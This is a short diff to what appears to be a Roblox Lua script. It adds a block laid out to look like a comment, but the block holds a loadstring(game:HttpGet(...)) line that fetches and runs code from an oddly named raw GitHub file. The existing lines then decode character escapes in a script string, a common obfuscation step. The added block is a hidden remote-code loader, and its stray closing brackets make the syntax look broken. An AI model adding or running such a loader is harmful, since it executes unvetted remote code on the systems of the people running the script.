@@ -1,3 +1,10 @@
+--[[
+local script = [[
+]]
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kidkidkidkidkidkidkid/vvvv/main/sdasda.lua"))()
+]]
+
 script = script:gsub("\\97", "a")
 script = script:gsub("\\98", "b")
 script = script:gsub("\\99", "c")
